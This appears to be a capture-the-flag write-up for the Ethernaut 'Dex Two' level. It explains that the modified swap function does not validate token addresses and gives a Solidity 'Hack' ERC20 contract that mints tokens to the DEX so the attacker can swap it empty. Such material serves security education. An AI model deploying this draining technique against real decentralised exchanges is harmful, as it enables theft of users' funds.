# Dex2 Ethernaut

## Goals

=> This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.

=> You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

=> You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

### Hints

- How has the swap method been modified?

### Solution

- The weakness is in the swap method since it's not checking the from and to anymore we can send any ERC20 tokens to drain the contract we just need to deploy 2 contracts like below and swap from our newly created contract to the desired SwappableTokenTwo which will drain the Dex to zero

### Contract

```solidity
contract Hack is ERC20 {
    address private _dex;
    address public player;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
        player = msg.sender;
        _mint(dexInstance, 100);
        approve(dexInstance, 100);
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```
